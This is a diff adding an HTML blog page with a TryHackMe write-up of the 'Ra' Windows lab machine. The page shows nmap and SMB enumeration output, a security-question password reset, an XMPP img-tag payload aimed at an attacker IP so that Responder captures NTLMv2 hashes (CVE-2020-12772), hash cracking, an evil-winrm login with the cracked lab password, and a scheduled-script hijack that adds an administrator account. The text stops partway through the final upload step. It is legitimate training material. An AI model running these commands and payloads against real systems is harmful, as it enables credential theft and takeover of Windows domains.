@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ra | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Ra</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Ra</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<p>```<br />
+ PORT     STATE SERVICE            VERSION<br />
+53/tcp   open  domain             Simple DNS Plus<br />
+80/tcp   open  http               Microsoft IIS httpd 10.0<br />
+|<em>http-title: Windcorp.<br />
+|_http-server-header: Microsoft-IIS/10.0<br />
+88/tcp   open  kerberos-sec       Microsoft Windows Kerberos (server time: 2026-01-04 05:21:38Z)<br />
+135/tcp  open  msrpc              Microsoft Windows RPC<br />
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn<br />
+389/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br />
+445/tcp  open  microsoft-ds?<br />
+464/tcp  open  kpasswd5?<br />
+593/tcp  open  ncacn_http         Microsoft Windows RPC over HTTP 1.0<br />
+636/tcp  open  ldapssl?<br />
+2179/tcp open  vmrdp?<br />
+3268/tcp open  ldap               Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br />
+3269/tcp open  globalcatLDAPssl?<br />
+3389/tcp open  ms-wbt-server      Microsoft Terminal Services<br />
+| ssl-cert: Subject: commonName=Fire.windcorp.thm<br />
+| Not valid before: 2026-01-03T05:20:22<br />
+|_Not valid after:  2026-07-05T05:20:22<br />
+|_ssl-date: 2026-01-04T05:23:22+00:00; 0s from scanner time.<br />
+5222/tcp open  jabber             Ignite Realtime Openfire Jabber server 3.10.0 or later<br />
+| ssl-cert: Subject: commonName=fire.windcorp.thm<br />
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:<em>.fire.windcorp.thm<br />
+| Not valid before: 2020-05-01T08:39:00<br />
+|<em>Not valid after:  2025-04-30T08:39:00<br />
+| xmpp-info: <br />
+|   STARTTLS Failed<br />
+|   info: <br />
+|     unknown: <br />
+|     errors: <br />
+|       invalid-namespace<br />
+|       (timeout)<br />
+|     compression_methods: <br />
+|     auth_mechanisms: <br />
+|     features: <br />
+|     xmpp: <br />
+|       version: 1.0<br />
+|     capabilities: <br />
+|</em>    stream_id: 66kuo510bu<br />
+|<em>ssl-date: 2026-01-04T05:23:27+00:00; 0s from scanner time.<br />
+5269/tcp open  xmpp               Wildfire XMPP Client<br />
+| xmpp-info: <br />
+|   STARTTLS Failed<br />
+|   info: <br />
+|     capabilities: <br />
+|     compression_methods: <br />
+|     errors: <br />
+|       (timeout)<br />
+|     features: <br />
+|     xmpp: <br />
+|     auth_mechanisms: <br />
+|</em>    unknown: <br />
+7070/tcp open  http               Jetty 9.4.18.v20190429<br />
+|_http-server-header: Jetty(9.4.18.v20190429)<br />
+|_http-title: Openfire HTTP Binding Service<br />
+7443/tcp open  ssl/http           Jetty 9.4.18.v20190429<br />
+| ssl-cert: Subject: commonName=fire.windcorp.thm<br />
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:</em>.fire.windcorp.thm<br />
+| Not valid before: 2020-05-01T08:39:00<br />
+|_Not valid after:  2025-04-30T08:39:00<br />
+7777/tcp open  socks5             (No authentication; connection failed)<br />
+| socks-auth-info: <br />
+|</em>  No authentication<br />
+9090/tcp open  hadoop-tasktracker Apache Hadoop<br />
+| hadoop-tasktracker-info: <br />
+|<em>  Logs: jive-ibtn jive-btn-gradient<br />
+| hadoop-datanode-info: <br />
+|</em>  Logs: jive-ibtn jive-btn-gradient<br />
+|_http-title: Site doesn't have a title (text/html).<br />
+9091/tcp open  ssl/http           Jetty<br />
+| ssl-cert: Subject: commonName=fire.windcorp.thm<br />
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br />
+| Not valid before: 2020-05-01T08:39:00<br />
+|_Not valid after:  2025-04-30T08:39:00</p>
+<p>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />
+Device type: general purpose<br />
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)<br />
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10<br />
+Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)<br />
+No exact OS matches for host (test conditions non-ideal).<br />
+Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<p>Host script results:<br />
+| smb2-security-mode: <br />
+|   3:1:1: <br />
+|<em>    Message signing enabled and required<br />
+| smb2-time: <br />
+|   date: 2026-01-04T05:22:36<br />
+|</em>  start_date: N/A</p>
+<p>```</p>
+<p>ChangeMe#1234</p>
+<pre class="codehilite"><code>└─$ crackmapexec smb windcorp.thm -u lilyle -p 'ChangeMe#1234'  --shares
+SMB         windcorp.thm    445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
+SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
+SMB         windcorp.thm    445    FIRE             [+] Enumerated shares
+SMB         windcorp.thm    445    FIRE             Share           Permissions     Remark
+SMB         windcorp.thm    445    FIRE             -----           -----------     ------
+SMB         windcorp.thm    445    FIRE             ADMIN$                          Remote Admin
+SMB         windcorp.thm    445    FIRE             C$                              Default share
+SMB         windcorp.thm    445    FIRE             IPC$            READ            Remote IPC
+SMB         windcorp.thm    445    FIRE             NETLOGON        READ            Logon server share 
+SMB         windcorp.thm    445    FIRE             Shared          READ            
+SMB         windcorp.thm    445    FIRE             SYSVOL          READ            Logon server share 
+SMB         windcorp.thm    445    FIRE             Users           READ            
+
+-------------------------------------------------------------------------
+┌──(kali㉿kali)-[~/tryhackme]
+└─$ crackmapexec smb windcorp.thm -u lilyle -p 'ChangeMe#1234'  --pass-pol
+SMB         windcorp.thm    445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
+SMB         windcorp.thm    445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
+SMB         windcorp.thm    445    FIRE             [+] Dumping password info for domain: WINDCORP
+SMB         windcorp.thm    445    FIRE             Minimum password length: 7
+SMB         windcorp.thm    445    FIRE             Password history length: 24
+SMB         windcorp.thm    445    FIRE             Maximum password age: 41 days 23 hours 53 minutes 
+SMB         windcorp.thm    445    FIRE             
+SMB         windcorp.thm    445    FIRE             Password Complexity Flags: 010001
+SMB         windcorp.thm    445    FIRE                 Domain Refuse Password Change: 0
+SMB         windcorp.thm    445    FIRE                 Domain Password Store Cleartext: 1
+SMB         windcorp.thm    445    FIRE                 Domain Password Lockout Admins: 0
+SMB         windcorp.thm    445    FIRE                 Domain Password No Clear Change: 0
+SMB         windcorp.thm    445    FIRE                 Domain Password No Anon Change: 0
+SMB         windcorp.thm    445    FIRE                 Domain Password Complex: 1
+SMB         windcorp.thm    445    FIRE             
+SMB         windcorp.thm    445    FIRE             Minimum password age: 1 day 4 minutes 
+SMB         windcorp.thm    445    FIRE             Reset Account Lockout Counter: 2 minutes 
+SMB         windcorp.thm    445    FIRE             Locked Account Duration: 2 minutes 
+SMB         windcorp.thm    445    FIRE             Account Lockout Threshold: 5
+SMB         windcorp.thm    445    FIRE             Forced Log off Time: Not Set
+</code></pre>
+
+<pre class="codehilite"><code>└─$ smbmap -u 'lilyle' -p 'ChangeMe#1234'  -H windcorp.thm  -r
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+
+[+] IP: 10.64.136.128:445       Name: windcorp.thm              Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        ./IPC$
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
+        fr--r--r--                6 Sun Dec 31 19:03:58 1600    lsass
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    scerpc
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-248-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-2bc-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-564-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-73c-0
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-348-0
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-348-1
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\49670
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    07c93646c137132a
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\593
+        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-b68-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    netdfs
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-334-0
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.134119775836499439.3884.DefaultAppDomain.powershell
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-ca4-0
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    TermSrv_API_service
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    Ctx_WinStation_API_service
+        fr--r--r--                3 Sun Dec 31 19:03:58 1600    SessEnvPublicRpc
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-17bc-0
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    iisipm29622189-9c6f-4c3e-aa8e-66c3d10fb17b
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    iislogpipe94a1c6ac-a3aa-4589-b04b-64ac8c2fa691
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.134119778375529052.1816.DefaultAppDomain.powershell
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.134119775820354846.3416.DefaultAppDomain.sme
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-c78-0
+        fr--r--r--                1 Sun Dec 31 19:03:58 1600    dotnet-diagnostic-2516
+        NETLOGON                                                READ ONLY       Logon server share 
+        ./NETLOGON
+        dr--r--r--                0 Sat May  2 06:02:19 2020    .
+        dr--r--r--                0 Sat May  2 06:02:19 2020    ..
+        Shared                                                  READ ONLY
+        ./Shared
+        dr--r--r--                0 Fri May 29 20:45:42 2020    .
+        dr--r--r--                0 Fri May 29 20:45:42 2020    ..
+        fr--r--r--               45 Fri May  1 11:32:36 2020    Flag 1.txt
+        fr--r--r--         29526628 Fri May 29 20:45:01 2020    spark_2_8_3.deb
+        fr--r--r--         99555201 Sun May  3 07:08:39 2020    spark_2_8_3.dmg
+        fr--r--r--         78765568 Sun May  3 07:08:39 2020    spark_2_8_3.exe
+        fr--r--r--        123216290 Sun May  3 07:08:39 2020    spark_2_8_3.tar.gz
+        SYSVOL                                                  READ ONLY       Logon server share 
+        ./SYSVOL
+        dr--r--r--                0 Sat May  2 06:02:20 2020    .
+        dr--r--r--                0 Sat May  2 06:02:20 2020    ..
+        dr--r--r--                0 Sat May  2 06:02:20 2020    NRznLVEcPj
+        dr--r--r--                0 Thu Apr 30 11:11:10 2020    windcorp.thm
+        Users                                                   READ ONLY
+        ./Users
+        dw--w--w--                0 Sat May  2 18:05:58 2020    .
+        dw--w--w--                0 Sat May  2 18:05:58 2020    ..
+        dr--r--r--                0 Sun May 10 07:18:11 2020    Administrator
+        dr--r--r--                0 Thu Apr 30 20:33:55 2020    All Users
+        dr--r--r--                0 Fri May  1 09:09:44 2020    angrybird
+        dr--r--r--                0 Fri May  1 09:09:34 2020    berg
+        dr--r--r--                0 Fri May  1 09:09:22 2020    bluefrog579
+        dr--r--r--                0 Sun May  3 09:30:02 2020    brittanycr
+        dr--r--r--                0 Fri May  1 09:09:08 2020    brownostrich284
+        dr--r--r--                0 Sun Jan  4 00:21:58 2026    buse
+        dw--w--w--                0 Thu Apr 30 19:35:11 2020    Default
+        dr--r--r--                0 Thu Apr 30 20:33:55 2020    Default User
+        fr--r--r--              174 Thu Apr 30 20:31:55 2020    desktop.ini
+        dr--r--r--                0 Fri May  1 09:08:54 2020    edward
+        dr--r--r--                0 Sat May  2 19:30:16 2020    freddy
+        dr--r--r--                0 Fri May  1 09:08:28 2020    garys
+        dr--r--r--                0 Sun Jan  4 00:36:05 2026    goldencat416
+        dr--r--r--                0 Fri May  1 09:08:17 2020    goldenwol
+        dr--r--r--                0 Fri May  1 09:08:06 2020    happ
+        dr--r--r--                0 Fri May  1 09:07:53 2020    happyme
+        dr--r--r--                0 Fri May  1 09:07:42 2020    Luis
+        dr--r--r--                0 Fri May  1 09:07:31 2020    orga
+        dr--r--r--                0 Fri May  1 09:07:19 2020    organicf
+        dr--r--r--                0 Sun Jan  4 00:31:59 2026    organicfish718
+        dr--r--r--                0 Fri May  1 09:07:06 2020    pete
+        dw--w--w--                0 Thu Apr 30 10:35:47 2020    Public
+        dr--r--r--                0 Fri May  1 09:06:54 2020    purplecat
+        dr--r--r--                0 Fri May  1 09:06:42 2020    purplepanda
+        dr--r--r--                0 Fri May  1 09:06:31 2020    sadswan
+        dr--r--r--                0 Sun Jan  4 00:35:23 2026    sadswan869
+        dr--r--r--                0 Fri May  1 09:06:20 2020    sheela
+        dr--r--r--                0 Fri May  1 09:05:39 2020    silver
+        dr--r--r--                0 Fri May  1 09:05:24 2020    smallf
+        dr--r--r--                0 Fri May  1 09:05:05 2020    spiff
+        dr--r--r--                0 Fri May  1 09:04:49 2020    tinygoos
+        dr--r--r--                0 Fri May  1 09:03:57 2020    whiteleopard
+</code></pre>
+
+<hr />
+<p>This writeup details the exploitation of the Ra machine on TryHackMe. The process involves web-based password resets, NTLM hash leaking via an XMPP vulnerability, and privilege escalation through a misconfigured PowerShell script.<br />
+1. Enumeration &amp; Initial Access</p>
+<p>An Nmap scan reveals several open ports, including 80 (HTTP), 445 (SMB), 3389 (RDP), and 5222 (XMPP/Openfire).<br />
+Web Reconnaissance</p>
+<p>The web server on Port 80 hosts the Windcorp employee portal.</p>
+<pre class="codehilite"><code>Username Discovery: The &quot;Staff&quot; page lists several usernames, including lilyle (Lily Levesque).
+
+Password Reset: The portal has a &quot;Reset Password&quot; feature. Lily's security question asks for her pet's name.
+
+Information Leak: In the &quot;Employees in Focus&quot; section, an image of a dog is named Sparky.
+
+Exploitation: Using lilyle and the answer Sparky, we reset her password to ChangeMe#1234.
+</code></pre>
+
+<ol>
+<li>Foothold: Leaking NTLM Hashes</li>
+</ol>
+<p>With lilyle’s credentials, we enumerate SMB shares.<br />
+Bash</p>
+<p>crackmapexec smb 10.10.x.x -u lilyle -p 'ChangeMe#1234' --shares</p>
+<p>Inside the Shared share, we find Spark 2.8.3 installation files. This version is vulnerable to CVE-2020-12772, where an <img> tag in a chat message forces the recipient to authenticate with their NTLM hash.</p>
+<p>Capturing the Hash</p>
+<pre class="codehilite"><code>Start Responder: sudo responder -I tun0
+
+Send Payload: Using an XMPP client (like Pidgin) or a script, log in as lilyle and send a message to user buse:
+
+    Payload: &lt;img src=&quot;http://&lt;YOUR_IP&gt;/a.png&quot;&gt;
+
+Hash Captured: Responder captures the NTLMv2 hash for WINDCORP\buse.
+</code></pre>
+
+<p>Cracking the Hash</p>
+<p>Using John the Ripper:<br />
+Bash</p>
+<p>john hash --wordlist=/usr/share/wordlists/rockyou.txt</p>
+<h1>Result: buse : uzunLM+3131</h1>
+<ol>
+<li>Privilege Escalation</li>
+</ol>
+<p>We gain a shell as buse using Evil-WinRM:<br />
+Bash</p>
+<p>evil-winrm -i 10.10.x.x -u buse -p 'uzunLM+3131'</p>
+<p>Account Operators Group</p>
+<p>Checking group membership (whoami /all) reveals buse is in the Account Operators group. This allows us to reset passwords for non-administrative accounts.<br />
+Script Analysis</p>
+<p>We find a script at C:\scripts\checkservers.ps1 that appears to be a scheduled task running as a high-privileged user. It attempts to read content from C:\Users\brittanycr\hosts.txt.<br />
+Hijacking the Execution Flow</p>
+<pre class="codehilite"><code>Reset Password: Reset brittanycr’s password since she owns the folder the script reads: net user brittanycr hello123#
+
+Create Payload: On Kali, create a hosts.txt file containing commands to create an admin: net user hacker Password123 /add; net localgroup Administrators hacker /add
+
+Upload Payload: Use smbclient to upload the file to brittanycr's directory:
+Bash
+</code></pre>
+
+<p>smbclient -U 'brittanycr' //10.10.x.x/Users<br />
+cd brittanycr -&gt; put hosts.txt</p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
